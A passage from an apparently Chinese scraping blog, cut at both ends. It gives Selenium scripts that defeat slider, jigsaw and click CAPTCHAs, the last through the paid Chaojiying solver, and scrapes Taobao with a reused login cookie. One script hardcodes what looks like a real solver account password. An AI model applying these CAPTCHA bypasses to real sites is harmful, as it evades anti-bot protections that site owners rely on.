滑块验证码</h1><p>这种验证码的验证机制比较简单，将滑块拖动到滑轨的最右端即可完成验证。验证思路：调用Selenium库，打开网页，定位滑块，模拟鼠标操作，移动滑块至滑轨最右端。（开发者工具查看滑块滑轨尺寸）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><br><span class="hljs-comment"># 1.访问网址</span><br>browser = webdriver.Chrome()<br><span class="hljs-comment"># url = r&#x27;E:\验证码反爬\滑块验证码\index.html&#x27;</span><br>current_dir = os.path.dirname(os.path.abspath(__file__))  <span class="hljs-comment"># 获取代码所在的文件夹目录</span><br>url = current_dir + <span class="hljs-string">&#x27;/index.html&#x27;</span>  <span class="hljs-comment"># 获取HTML文件的文件绝对路径</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;此时的文件路径为：&#x27;</span> + url)  <span class="hljs-comment"># 打印此时的文件路径，所以如果文件位置固定，可以直接写url = r&#x27;文件路径&#x27;</span><br>browser.get(url)  <span class="hljs-comment"># 访问网址</span><br><br><span class="hljs-comment"># 2.获取滑块按钮</span><br>huakuai = browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;code-box&quot;]/span&#x27;</span>)  <span class="hljs-comment"># 获取滑块按钮</span><br><br><span class="hljs-comment"># 3.开始滑动</span><br>action = webdriver.ActionChains(browser)  <span class="hljs-comment"># 启动滑动功能</span><br>action.click_and_hold(huakuai).perform()  <span class="hljs-comment"># 按住滑块</span><br>time.sleep(<span class="hljs-number">2</span>)  <span class="hljs-comment"># 休息两秒，来看效果，不然执行太快了</span><br>action.move_by_offset(<span class="hljs-number">260</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># 移动滑块</span><br>action.release().perform()  <span class="hljs-comment"># 释放滑块</span><br></code></pre></td></tr></table></figure><p>注：如果网站采取了webdriver反爬，处理起来会比较困难。解决方法：如果是登录阶段需要进行滑块验证，则可以在代码中使用time.sleep()等待一段时间，在这段时间内使用手动登录，之后再用Selenium库继续爬取。</p><h1 id="滑动拼图验证码">4. 滑动拼图验证码</h1><ul><li>初级版：网页源码中<strong>包含</strong>缺口位置信息</li><li>高级版：网页源码中<strong>不包含</strong>缺口位置信息</li></ul><h2 id="初级版">4.1 初级版</h2><p>初级版滑动拼图验证码是在普通滑块验证码的基础上增加了随机的滑动距离，用户需要根据拼图的缺口位置来决定滑块的滑动距离。<strong>模拟缓慢滑动</strong>：将滑动距离分段，让滑块分多次滑动，每次滑动后等待一定时间。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">import</span> os<br><br>browser = webdriver.Chrome()<br><br>current_dir = os.path.dirname(os.path.abspath(__file__))  <span class="hljs-comment"># 获取代码所在的文件夹目录</span><br>url = current_dir + <span class="hljs-string">&#x27;/index.html&#x27;</span>  <span class="hljs-comment"># 获取HTML文件的文件绝对路径</span><br><span class="hljs-built_in">print</span>(url)  <span class="hljs-comment"># 打印此时的文件路径，所以如果文件位置固定，可以直接写url = r&#x27;文件路径&#x27;</span><br>browser.get(url)<br><br><span class="hljs-comment"># 定位滑块</span><br>slider = browser.find_element_by_id(<span class="hljs-string">&#x27;slideBtn&#x27;</span>)<br><br>action = webdriver.ActionChains(browser)<br>action.click_and_hold(slider).perform()<br>time.sleep(<span class="hljs-number">2</span>)<br>data = browser.page_source<br><br>p_tbk = <span class="hljs-string">&#x27;&lt;div class=&quot;slide-box-shadow&quot;.*?left: (.*?)px&#x27;</span><br>tbk_left = re.findall(p_tbk, data, re.S)<br><span class="hljs-built_in">print</span>(tbk_left)<br>distance = <span class="hljs-built_in">float</span>(tbk_left[<span class="hljs-number">0</span>]) - <span class="hljs-built_in">float</span>(<span class="hljs-number">2</span>)<br><span class="hljs-built_in">print</span>(distance)<br><br><span class="hljs-comment"># 开始滑动~！偶尔会因为移动太快导致验证失败，可以重新运行程序进行尝试</span><br>action.move_by_offset(distance, <span class="hljs-number">0</span>)<br>time.sleep(<span class="hljs-number">2</span>)<br>action.release().perform()<br></code></pre></td></tr></table></figure><h2 id="高级版">4.2 高级版</h2><p>使用PIL库<code>pip install pillow</code>对比无缺口和有缺口的图像，从而计算出滑块需要滑动的距离<code>ImageChops.difference(image_a,image_b).getbbox</code>：返回坐标值元组。前两个元素为缺口左上角的x坐标和y坐标，后两个元素为缺口右下角的x坐标和y坐标。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageChops<br><br><span class="hljs-comment"># 1.访问网址</span><br>browser = webdriver.Chrome()<br><span class="hljs-comment"># url = r&#x27;E:\验证码反爬\高级滑动拼图验证码\index.html&#x27;  # 自己用的话可以直接写这样的固定路径</span><br>current_dir = os.path.dirname(os.path.abspath(__file__))  <span class="hljs-comment"># 获取代码所在的文件夹目录</span><br>url = current_dir + <span class="hljs-string">&#x27;/index.html&#x27;</span>  <span class="hljs-comment"># 获取HTML文件的文件绝对路径</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;此时的文件路径为：&#x27;</span> + url)  <span class="hljs-comment"># 打印此时的文件路径，所以如果文件位置固定，可以直接写url = r&#x27;文件路径&#x27;</span><br>browser.get(url)  <span class="hljs-comment"># 访问网址</span><br>time.sleep(<span class="hljs-number">2</span>)<br><br><span class="hljs-comment"># 2.获取原始图片</span><br>browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;jigsawCanvas&quot;]&#x27;</span>).screenshot(<span class="hljs-string">&#x27;origin.png&#x27;</span>)  <span class="hljs-comment"># 获取原始图片</span><br><br><span class="hljs-comment"># 3.获取有缺口的图片</span><br>slider = browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;jigsawCircle&quot;]&#x27;</span>)  <span class="hljs-comment"># 获取滑动按钮</span><br>slider.click()  <span class="hljs-comment"># 先模拟点击下，方便下面获取到有缺口的图片</span><br>browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;jigsawCanvas&quot;]&#x27;</span>).screenshot(<span class="hljs-string">&#x27;after.png&#x27;</span>)  <span class="hljs-comment"># 获取有缺口的图片</span><br><br><span class="hljs-comment"># 4.比较两幅图片的区别，获取需要移动的距离</span><br>image_a = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;origin.png&#x27;</span>).convert(<span class="hljs-string">&#x27;RGB&#x27;</span>)  <span class="hljs-comment"># 打开原始图片</span><br>image_b = Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;after.png&#x27;</span>).convert(<span class="hljs-string">&#x27;RGB&#x27;</span>)  <span class="hljs-comment"># 打开有缺口的图片</span><br>x = ImageChops.difference(image_a, image_b).getbbox()  <span class="hljs-comment"># 比较两个图片的差别</span><br><span class="hljs-built_in">print</span>(x)  <span class="hljs-comment"># 举个例子：倘若x为：(226, 103, 277, 154)；返回缺口对应的左边横坐标（由左往右看），上边纵坐标（由上往下看），右边横坐标，下边纵坐标</span><br>distance = x[<span class="hljs-number">0</span>]  <span class="hljs-comment"># 第一个元素x[0]表示的就是缺口左边横坐标，也就是滑块需要移动的距离</span><br><span class="hljs-built_in">print</span>(distance)  <span class="hljs-comment"># 如果例子为：(226, 103, 277, 154)，那么需要移动的距离为226</span><br><br><span class="hljs-comment"># 5.开始滑动！</span><br>action = webdriver.ActionChains(browser)  <span class="hljs-comment"># 启动Selenium的动作链</span><br>action.click_and_hold(slider).perform()  <span class="hljs-comment"># 按住滑动按钮不松开</span><br>action.move_by_offset(distance-<span class="hljs-number">10</span>, <span class="hljs-number">0</span>)  <span class="hljs-comment"># 开始滑动！这里-10，是把初始圆角矩形左侧left属性值给减去了，这样更准确</span><br>action.release().perform()  <span class="hljs-comment"># 释放滑块</span><br></code></pre></td></tr></table></figure><p>解决方案：<ahref="https://blog.csdn.net/u010698107/article/details/121163283">Python3PIL库问题：ImageChops.difference返回None-CSDN博客</a></p><h1 id="点选验证码">5. 点选验证码</h1><p>通过传统的图像识别方法进行识别比较麻烦，但超级鹰提供了相应的接口，类型代码为9004。返回格式：<code>282,54|489,59|513,44|342,157</code>。选择图片保存时，需涵盖上方的图片和下方的文字说明。</p><figure><imgsrc="https://raw.githubusercontent.com/kaikaikai7/BlogImage/main/img/202312101132640.png"alt="image-20231210113224618" /><figcaption aria-hidden="true">image-20231210113224618</figcaption></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> chaojiying <span class="hljs-keyword">import</span> Chaojiying_Client<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cjy</span>():  <span class="hljs-comment"># 定义超级鹰识别函数</span><br>    chaojiying = Chaojiying_Client(<span class="hljs-string">&#x27;fgwyt123&#x27;</span>, <span class="hljs-string">&#x27;wyt941025&#x27;</span>, <span class="hljs-string">&#x27;905908&#x27;</span>)  <span class="hljs-comment"># 账号、密码、ID号（ID号不用改好像也没事）</span><br>    im = <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a.png&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>).read()  <span class="hljs-comment"># 本地图片文件路径</span><br>    code = chaojiying.PostPic(im, <span class="hljs-number">9004</span>)[<span class="hljs-string">&#x27;pic_str&#x27;</span>]  <span class="hljs-comment"># 9004用来识别各个点的坐标</span><br>    <span class="hljs-keyword">return</span> code  <span class="hljs-comment"># 返回识别的结果，这里返回的是各个点选文字的坐标，如：282,54|472,59|513,144|342,157，第一个点坐标就是（282, 54）</span><br><br><br><span class="hljs-comment"># 1.访问网址</span><br>browser = webdriver.Chrome()<br><span class="hljs-comment"># url = r&#x27;E:\验证码反爬\点选验证码\index.html&#x27;  # 自己用的话可以直接写这样的固定路径</span><br>current_dir = os.path.dirname(os.path.abspath(__file__))  <span class="hljs-comment"># 获取代码所在的文件夹目录</span><br>url = current_dir + <span class="hljs-string">&#x27;/index.html&#x27;</span>  <span class="hljs-comment"># 通过拼接获取HTML文件的文件绝对路径，/相当于\\，所以拼接的时候也可以写&#x27;\\index.html&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;此时的文件路径为：&#x27;</span> + url)  <span class="hljs-comment"># 打印此时的文件路径，所以如果文件位置固定，可以直接写url = r&#x27;文件路径&#x27;</span><br>browser.get(url)  <span class="hljs-comment"># 访问网址</span><br>time.sleep(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 让那个验证码稍微加载会</span><br><br><span class="hljs-comment"># 2.捕捉并截取图片</span><br>canvas = browser.find_element_by_xpath(<span class="hljs-string">&#x27;//*[@id=&quot;verify&quot;]&#x27;</span>)  <span class="hljs-comment"># 捕捉图片</span><br>canvas.screenshot(<span class="hljs-string">&#x27;a.png&#x27;</span>)  <span class="hljs-comment"># 截取图片</span><br><br><span class="hljs-comment"># 3.使用超级鹰识别，获得各点的位置坐标</span><br>result = cjy()<br><span class="hljs-built_in">print</span>(result)  <span class="hljs-comment"># 此时获得各点的坐标，但是各点坐标格式不太规范</span><br><br><span class="hljs-comment"># 4.对获取的坐标数据进行一些处理</span><br>all_location = []  <span class="hljs-comment"># 创建一个空列表，用来规范各点坐标</span><br>list_temp = result.split(<span class="hljs-string">&#x27;|&#x27;</span>)  <span class="hljs-comment"># 利用“|”将各个点的坐标提取出来，list_temp是个临时列表</span><br><span class="hljs-built_in">print</span>(list_temp)  <span class="hljs-comment"># 打印临时列表，方便大家理解</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> list_temp:  <span class="hljs-comment"># 遍历上面的临时列表</span><br>    list_i = []  <span class="hljs-comment"># 用来存储每点的坐标</span><br>    x = <span class="hljs-built_in">int</span>(i.split(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">0</span>])  <span class="hljs-comment"># 第一个元素为横坐标，并将字符串转为整数</span><br>    y = <span class="hljs-built_in">int</span>(i.split(<span class="hljs-string">&#x27;,&#x27;</span>)[<span class="hljs-number">1</span>])  <span class="hljs-comment"># 第二个元素为纵坐标，并将字符串转为整数</span><br>    list_i.append(x)  <span class="hljs-comment"># 添加横坐标</span><br>    list_i.append(y)  <span class="hljs-comment"># 添加纵坐标</span><br>    all_location.append(list_i)  <span class="hljs-comment"># 汇总每一点的坐标</span><br><span class="hljs-built_in">print</span>(all_location)  <span class="hljs-comment"># 此时转换成立规范的坐标</span><br><br><span class="hljs-comment"># 5.依次模拟点击文字</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> all_location:<br>    x = i[<span class="hljs-number">0</span>]  <span class="hljs-comment"># x坐标</span><br>    y = i[<span class="hljs-number">1</span>]  <span class="hljs-comment"># y坐标</span><br>    action = webdriver.ActionChains(browser)  <span class="hljs-comment"># 启动Selenium的动作链</span><br>    action.move_to_element_with_offset(canvas, x, y).click().perform()  <span class="hljs-comment"># 模拟点击</span><br>    time.sleep(<span class="hljs-number">1</span>)  <span class="hljs-comment"># 休息1秒</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>Python</category>
      
      <category>Spider</category>
      
      <category>网络爬虫案例实战</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Cookie模拟登录</title>
    <link href="/2023/12/09/Python/Spider/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/Cookie%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/"/>
    <url>/2023/12/09/Python/Spider/%E7%BD%91%E7%BB%9C%E7%88%AC%E8%99%AB%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98/Cookie%E6%A8%A1%E6%8B%9F%E7%99%BB%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="引言">0. 引言</h1><p>在爬虫中，使用Cookie进行模拟登录的主要目的是绕过网站的身份验证机制，以便能够访问需要登录状态的页面或执行需要登录权限的操作。对于这类需求，如果对爬取速度要求不高，可以使用Selenium库进行手动登录，再继续使用Selenium库访问所需网页并获取网页源码。如果对爬取速度要求较高，可以先通过Selenium库模拟登录以获取Cookie，再结合Requests库进行模拟爬取。</p><h1 id="cookie模拟登录的原理">1. Cookie模拟登录的原理</h1><h2 id="客户端和服务端">1.1 客户端和服务端</h2><ul><li>客户端：请求服务的一方，通常是用户使用的设备或应用程序</li><li>服务端：提供服务或资源的一方，负责接收并处理客户端的请求，并返回相应的数据或结果。</li></ul><h2 id="http的无状态性">1.2 HTTP的无状态性</h2><p>HTTP（Hypertext TransferProtocol）是一种用于在Web上传输数据的协议。其中一个显著的特征是它的"无状态性"（statelessness），这意味着每个HTTP请求都是独立的，服务器不会在多个请求之间保留任何关于客户端的信息。</p><h2 id="cookie的含义与作用">1.3 Cookie的含义与作用</h2><p>Cookie是一种在<strong>用户计算机</strong>上存储的小型文本文件，用于在Web浏览器和服务器之间传递用户信息，实现会话管理和个性化体验。</p><h2 id="session的含义与作用">1.4 Session的含义与作用</h2><p>Session（会话）是在<strong>服务器端</strong>存储用户信息的一种机制，用于跟踪用户在网站上的活动状态，实现用户与服务器之间的交互。</p><h2 id="cookie和session的交互">1.5 Cookie和Session的交互</h2><p>Cookie和Session在Web应用中通常一起使用，协同工作以实现用户状态的跟踪和管理。下面是它们之间的基本交互过程：</p><ol type="1"><li><p><strong>客户端发起请求：</strong>用户在浏览器中访问一个Web应用，向服务器发起HTTP请求。</p></li><li><p><strong>服务器创建Session：</strong>服务器接收到请求后，为该用户创建一个新的会话（Session）并生成一个唯一的会话标识符（SessionID）。</p></li><li><p><strong>Session ID存储在Cookie中：</strong>服务器通过响应的HTTP头部将该SessionID存储在一个名为"Set-Cookie"的Cookie中。</p></li><li><p><strong>Cookie存储在客户端：</strong>客户端的浏览器接收到包含Session ID的Cookie后，将其存储在本地。</p></li><li><p><strong>客户端再次发起请求：</strong>在用户继续浏览网站的过程中，浏览器会在每个请求中自动包含之前存储的Cookie信息，其中就包括了SessionID。</p></li><li><p><strong>服务器验证Session ID：</strong> 服务器接收到带有SessionID的请求后，解析其中的SessionID，然后查找与该ID关联的会话数据。</p></li><li><p><strong>使用Session数据：</strong> 如果找到与SessionID关联的会话数据，服务器就可以使用这些数据，例如验证用户身份、维护用户的登录状态、存储用户的个性化设置等。</p></li><li><p><strong>更新Session数据：</strong>在用户与网站的交互过程中，服务器可能会更新会话数据，以跟踪用户的活动状态。</p></li><li><p><strong>会话结束：</strong>当用户关闭浏览器或一段时间内没有活动时，服务器可能会清理过期的会话数据，从而结束会话。</p></li></ol><p>这个交互过程允许服务器保持对用户的状态进行跟踪，而无需在每个请求中发送大量的数据。使用Cookie存储SessionID，可以在用户访问不同页面时持续传递会话信息，而Session数据则存储在服务器端，提高了安全性和隐私性。</p><h1 id="案例1模拟登录淘宝并爬取数据">2.案例1：模拟登录淘宝并爬取数据</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>headers = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span>&#125;<br><br><span class="hljs-comment"># 1.模拟登陆 + 获取Cookie</span><br>browser = webdriver.Chrome()<br>url = <span class="hljs-string">&#x27;https://login.taobao.com/member/login.jhtml&#x27;</span><br>browser.get(url)<br><span class="hljs-comment"># browser.find_element_by_xpath(&#x27;//*[@id=&quot;login&quot;]/div[1]/i&#x27;).click()  # 通过这行代码可以自动切换成二维码模式，其实手动点也可以</span><br>time.sleep(<span class="hljs-number">20</span>)  <span class="hljs-comment"># 留20秒或者更长的时间来手动进行登录；推荐扫码登陆</span><br>cookies = browser.get_cookies()  <span class="hljs-comment"># 获取Cookie</span><br><br><span class="hljs-comment"># 2.修改Cookie数据格式</span><br>cookie_dict = &#123;&#125;<br><span class="hljs-keyword">for</span> item <span class="hljs-keyword">in</span> cookies:<br>    cookie_dict[item[<span class="hljs-string">&#x27;name&#x27;</span>]] = item[<span class="hljs-string">&#x27;value&#x27;</span>]<br><br><span class="hljs-comment"># 3.Requests库使用Cookie</span><br>url = <span class="hljs-string">&#x27;https://s.taobao.com/search?q=华为&#x27;</span><br>res = requests.get(url, headers=headers, cookies=cookie_dict).text<br><br><span class="hljs-comment"># 验证是否登录成功</span><br><span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;fgwyt94&#x27;</span> <span class="hljs-keyword">in</span> res:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;登录成功&#x27;</span>)<br><br><span class="hljs-comment"># 4.正则表达式提取信息</span><br>title = re.findall(<span class="hljs-string">&#x27;&quot;raw_title&quot;:&quot;(.*?)&quot;&#x27;</span>, res)<br>price = re.findall(<span class="hljs-string">&#x27;&quot;view_price&quot;:&quot;(.*?)&quot;&#x27;</span>, res)<br>sale = re.findall(<span class="hljs-string">&#x27;&quot;view_sales&quot;:&quot;(.*?)人付款&quot;&#x27;</span>, res)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(title)):<br>    <span class="hljs-built_in">print</span>(title[i] + <span class="hljs-string">&#x27;，价格为：&#x27;</span> + price[i] + <span class="hljs-string">&#x27;，销量为：&#x27;</span> + sale[i])<br></code></pre></td></tr></table></figure><p>注：淘宝网使用了动态渲染处理，而Requests库获取的是动态渲染前的网页源代码，缺失了大量信息，<code>BeautifulSoup</code>库难以成功定位目标信息，因此上述代码使用正则表达式解析和提取数据。在测试时，由于淘宝升级了反爬机制，上述代码已失效，可以利用Selenium库解决。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 导入Selenium库中的webdriver模块</span><br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-comment"># 导入time模块</span><br><span class="hljs-keyword">import</span> time<br><span class="hljs-comment"># 导入正则表达式模块</span><br><span class="hljs-keyword">import</span> re<br><br><span class="hljs-comment"># 使用Edge浏览器驱动，指定MicrosoftWebDriver.exe的路径</span><br>browser = webdriver.Edge(<span class="hljs-string">&quot;C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\MicrosoftWebDriver.exe&quot;</span>)<br><br><span class="hljs-comment"># 登录淘宝页面</span><br>url = <span class="hljs-string">&quot;https://login.taobao.com/member/login.jhtml&quot;</span><br>browser.get(url)<br><span class="hljs-comment"># 等待20秒，确保登录完成</span><br>time.sleep(<span class="hljs-number">20</span>)<br><br><span class="hljs-comment"># 目标搜索页面</span><br>target_url = <span class="hljs-string">&quot;https://s.taobao.com/search?q=华为Mate60&quot;</span><br>browser.get(target_url)<br><span class="hljs-comment"># 获取页面源代码</span><br>data = browser.page_source<br><br><span class="hljs-comment"># 使用正则表达式提取商品标题、价格和销量信息</span><br><span class="hljs-comment"># 测试使用，不能精确提取信息</span><br>title = re.findall(<span class="hljs-string">&#x27;&lt;span class=&quot;&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>, data)<br>price = re.findall(<span class="hljs-string">&#x27;&lt;span class=&quot;Price--priceInt--ZlsSi_M&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>, data)<br>sale = re.findall(<span class="hljs-string">&#x27;&lt;span class=&quot;Price--realSales--FhTZc7U&quot;&gt;(.*?)&lt;/span&gt;&#x27;</span>, data)<br><br><span class="hljs-comment"># 打印提取到的信息</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(title)):<br>    <span class="hljs-built_in">print</span>(title[i] + <span class="hljs-string">&#x27;,价格：&#x27;</span> + price[i] + <span class="hljs-string">&#x27;,销量：&#x27;</span> + sale[i])<br></code></pre></td></tr></table></figure><h1 id="案例2模拟登录新浪微博并爬取数据">3.案例2：模拟登录新浪微博并爬取数据</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> chaojiying <span class="hljs-keyword">import</span> Chaojiying_Client  <span class="hljs-comment"># 引入破解图片验证码所用到的库</span><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br>headers = &#123;<span class="hljs-string">&#x27;User-Agent&#x27;</span>:<span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36&#x27;</span>&#125;<br><br><span class="hljs-comment"># 1.模拟访问网址</span><br>url = <span class="hljs-string">&quot;https://weibo.com/&quot;</span><br>browser = webdriver.Chrome()<br>browser.get(url)  <span class="hljs-comment"># 访问微博官网</span><br>browser.maximize_window()  <span class="hljs-comment"># 需要全屏后才能显示那个登录框</span><br>time.sleep(<span class="hljs-number">5</span>)  <span class="hljs-comment"># 